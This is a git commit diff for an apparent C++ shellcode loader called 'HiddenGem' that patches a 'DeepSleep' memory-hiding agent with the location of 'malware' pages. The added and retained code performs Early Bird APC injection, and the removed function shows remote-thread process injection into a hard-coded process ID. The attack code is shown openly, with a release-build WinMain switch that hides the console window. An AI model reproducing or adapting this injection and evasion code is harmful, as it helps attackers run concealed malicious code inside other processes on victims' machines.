a37c7ba15f7a2ef074af87a27cb0c67898ecded0
ZeDeCe <no9no3@gmail.com>
2023-04-30 23:54:55 +0300

    Change main binary loading type

--- HiddenGem/main.cpp
+++ HiddenGem/main.cpp
@@ -1,15 +1,15 @@
-#include <Windows.h>
+#include <windows.h>
 #include <iostream>
 #include <fstream>
-#include <string>
+#include <string.h>
 #include "shellcode.h"
 
 
-bool replaceBytes2(byte* data, size_t data_size, const byte search[], const byte replace[]) {
-	int i = 0;
+bool replaceBytes(byte* data, size_t data_size, const byte search[], const byte replace[]) {
+	size_t i = 0;
 	bool found = false;
 	for (; i < data_size; i++) {
-		if (std::memcmp(search, &(data[i]), sizeof(search)-1) == 0) {
+		if (memcmp(search, &(data[i]), (size_t)(sizeof(search))-1) == 0) {
 			found = true;
 			break;
 		}
@@ -18,12 +18,14 @@ bool replaceBytes2(byte* data, size_t data_size, const byte search[], const byte
 		return false;
 	}
 
-	for (int j = 0; j < sizeof(replace); j++) {
+	for (size_t j = 0; j < (size_t)sizeof(replace); j++) {
 		data[j + i] = replace[j];
 	}
 	return true;
 }
 
+// This entire function is needed since we don't know the actual location of the allocated malware pages and size
+// So we need to pass them as a variable to our deepsleep agent
 SIZE_T prepare(IN LPVOID malwareAlloc, OUT byte** deepSleep) {
 	std::fstream bin;
 	const byte search[] = { 0x88, 0x88, 0x88 , 0x88 , 0x88 , 0x88 , 0x88 , 0x88 };
@@ -34,11 +36,10 @@ SIZE_T prepare(IN LPVOID malwareAlloc, OUT byte** deepSleep) {
 	size_t shellcodeSizeT = sizeof(shellcode);
 	byte* replace2 = static_cast<byte*>(static_cast<void*>(&shellcodeSizeT));
 
-	bin.open(R"(C:\Users\Sapshoosh\source\repos\DeepSleep\DeepSleep.bin)", std::ios::out | std::ios::in | std::ios::binary);
+	bin.open(R"(DeepSleep.bin)", std::ios::out | std::ios::in | std::ios::binary);
 	if (!bin.is_open()) {
 		return 0;
 	}
-	
 
 	bin.seekg(0, std::ios::end);
 	size_t deepSleepSize = bin.tellg();
@@ -46,65 +47,19 @@ SIZE_T prepare(IN LPVOID malwareAlloc, OUT byte** deepSleep) {
 	*deepSleep = new byte[deepSleepSize];
 	bin.read((char*)*deepSleep, deepSleepSize);
 
-	
-
-	if (!replaceBytes2(*deepSleep, deepSleepSize, search, replace)) {
+	if (!replaceBytes(*deepSleep, deepSleepSize, search, replace)) {
 		std::cout << "Can't replace 8s" << std::endl;
-		return 0;
+		goto exit;
+		
 	}
-	if (!replaceBytes2(*deepSleep, deepSleepSize, search2, replace2)) {
+	if (!replaceBytes(*deepSleep, deepSleepSize, search2, replace2)) {
 		std::cout << "Can't replace 9s" << std::endl;
+		goto exit;
 	}
 	return deepSleepSize;
-}
-
-int processInject() {
-	DWORD oldProtect;
-	byte* deepSleep;
-
-	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, 11548);
-	if (!procHandle) {
-		std::cout << "Can't open process" << std::endl;
-		return 0;
-	}
-	
-	LPVOID malwareAlloc = VirtualAllocEx(procHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
-	if (malwareAlloc == NULL) {
-		return 0;
-	}
-	if (!VirtualProtectEx(procHandle, malwareAlloc, sizeof(shellcode), PAGE_READWRITE, &oldProtect)) {
-		return 0;
-	}
-	
-	size_t deepSleepSize = prepare(malwareAlloc, &deepSleep);
-
-	LPVOID protectorAlloc = VirtualAllocEx(procHandle, NULL, deepSleepSize, MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
-	if (!protectorAlloc) {
-		return 0;
-	}
-	if (!VirtualProtectEx(procHandle, protectorAlloc, deepSleepSize, PAGE_EXECUTE_READ, &oldProtect)) {
-		return 0;
-	}
-
-	size_t numBytes = 0;
-	if (!WriteProcessMemory(procHandle, malwareAlloc, &shellcode, sizeof(shellcode), &numBytes)) {
-		return 0;
-	}
-	if (!WriteProcessMemory(procHandle, protectorAlloc, deepSleep, deepSleepSize, &numBytes)) {
-		return 0;
-	}
-	
-	SECURITY_ATTRIBUTES attr = { 0 };
-
-	if (!VirtualProtectEx(procHandle, malwareAlloc, sizeof(shellcode), PAGE_NOACCESS, &oldProtect)) {
-		return 0;
-	}
-	
-	HANDLE thread = CreateRemoteThread(procHandle, &attr, 0, (LPTHREAD_START_ROUTINE)protectorAlloc, nullptr, NULL, NULL);
-	if (!thread) {
-		return 0;
-	}
-	return 1;
+exit:
+	bin.close();
+	return 0;
 }
 
 int earlyBird() {
@@ -153,11 +108,18 @@ int earlyBird() {
 		return 0;
 	}
 
-	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, 0);
 	ResumeThread(threadHandle);
+	return 1;
 }
 
+// WinMain
+#ifdef _DEBUG
 int main() {
+#else
+int APIENTRY WinMain(HINSTANCE, HINSTANCE, PSTR, int) {
+#endif
 	int success = earlyBird();
 	std::cout << success;
+	return 1;
 }
